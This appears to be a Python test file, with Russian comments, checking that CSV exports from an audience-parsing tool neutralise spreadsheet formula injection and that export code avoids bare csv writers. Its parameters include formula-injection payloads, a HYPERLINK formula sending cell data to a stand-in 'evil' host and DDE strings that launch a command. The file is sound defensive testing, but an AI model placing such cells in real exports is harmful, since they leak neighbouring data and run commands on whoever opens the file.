"""Выгрузки CSV не превращают чужой текст в формулы Excel.

Имя участника «=HYPERLINK(…)» или «=cmd|' /C calc'!A0» из парсинга аудитории
попадало в CSV как есть и в Excel/Google Таблицах становилось формулой:
утечка соседних ячеек (телефонов) и запуск команд. Тест падает без фикса.
"""
from __future__ import annotations

import ast
import csv
import io
import pathlib

import pytest

from services.security import csv_safe_cell, safe_csv_dict_writer, safe_csv_writer

ROOT = pathlib.Path(__file__).resolve().parents[1]


@pytest.mark.parametrize("bad", [
    '=HYPERLINK("https://evil/?"&A2,"x")', "+cmd|' /C calc'!A0", "-2+3+cmd|x",
    "@SUM(A1:A9)", "\t=1+1", "\r=1",
])
def test_formula_cells_are_quoted(bad):
    assert csv_safe_cell(bad) == "'" + bad


@pytest.mark.parametrize("ok", ["+7 999 123-45-67", "-5", "+380 (44) 123 45 67",
                                "Иван", "", 42, None, "a=b"])
def test_plain_values_untouched(ok):
    assert csv_safe_cell(ok) == ok


def test_writers_apply_it():
    buf = io.StringIO()
    safe_csv_writer(buf).writerows([["=1+1", "+7 999"]])
    d = io.StringIO()
    w = safe_csv_dict_writer(d, fieldnames=["n"])
    w.writeheader()
    w.writerow({"n": "@x"})
    assert list(csv.reader(io.StringIO(buf.getvalue()))) == [["'=1+1", "+7 999"]]
    assert d.getvalue().splitlines() == ["n", "'@x"]


def test_no_bare_csv_writers_in_exports():
    """Новая выгрузка — через safe_csv_writer. Разбор чужого CSV на входе
    (global_presence: нормализация загруженного файла) — не выгрузка."""
    bad = []
    for path in sorted((ROOT / "services").rglob("*.py")) + sorted((ROOT / "bot").rglob("*.py")):
        rel = str(path.relative_to(ROOT))
        if rel == "services/security.py":
            continue
        src = path.read_text(encoding="utf-8", errors="replace")
        if "csv" not in src:
            continue
        for node in ast.walk(ast.parse(src)):
            if (isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)
                    and node.func.attr in ("writer", "DictWriter")
                    and isinstance(node.func.value, ast.Name)
                    and node.func.value.id in ("csv", "_csv")):
                seg = ast.get_source_segment(src, node) or ""
                if rel == "bot/handlers/global_presence.py" and "normalized" in seg:
                    continue
                bad.append(f"{rel}:{node.lineno}")
    assert not bad, bad
